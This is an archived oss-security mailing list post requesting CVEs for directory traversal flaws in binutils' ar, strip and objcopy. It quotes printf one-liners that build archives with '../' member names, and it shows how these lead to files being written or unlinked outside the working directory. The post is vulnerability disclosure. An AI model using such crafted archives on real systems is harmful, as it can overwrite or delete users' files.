X-Archive-Source: openwall-scrape
X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/11/04/10
Message-ID: <5459547E.1090408@mccme.ru>
Date: Wed, 05 Nov 2014 01:34:38 +0300
From: Alexander Cherepanov <cherepan@...me.ru>
To: oss-security@...ts.openwall.com
Subject: CVE Request: binutils -- directory traversal
Content-Type: text/plain; charset=utf-8

Hello,

it seems binutils don't check paths when extracting files from archives.

----------------------------------------------------------------------
 From https://sourceware.org/bugzilla/show_bug.cgi?id=17533#c4 :

directory traversal [in ar]:

$ printf '!<arch>\n%-48s%-10d`\n../file\n%-48s%-10s`\n' '//' 8 '/0' 0 > 
test.a
$ ar xv test.a
x - ../file

 From https://sourceware.org/bugzilla/show_bug.cgi?id=17533#c7 :

Both absolute and relative paths could be used for the attack.

----------------------------------------------------------------------
 From https://sourceware.org/bugzilla/show_bug.cgi?id=17552 :

strip and objcopy don't filter out .. components from paths inside archive.

Consider an archive created with the following command:

$ printf '!<arch>\n%-48s%-10d`\n../file\n%-48s%-10s`\n' '//' 8 '/0' 0 > 
test.a

then runnig strip/objcopy on it will unlink ./file (e.g. 
unlink("stq0g2tL/../st4Mtgu4/../file") ).

Consider this:

$ printf '!<arch>\n%-48s%-10d`\n../../file\n\n%-48s%-10s`\n' '//' 12 
'/0' 0 > test.a

then runnig strip/objcopy on it will unlink ../../file (e.g. 
unlink("staOxyFW/../../st4KIqLm/../../file") ).

----------------------------------------------------------------------

Could CVEs please be assigned to these issues?

-- 
Alexander Cherepanov
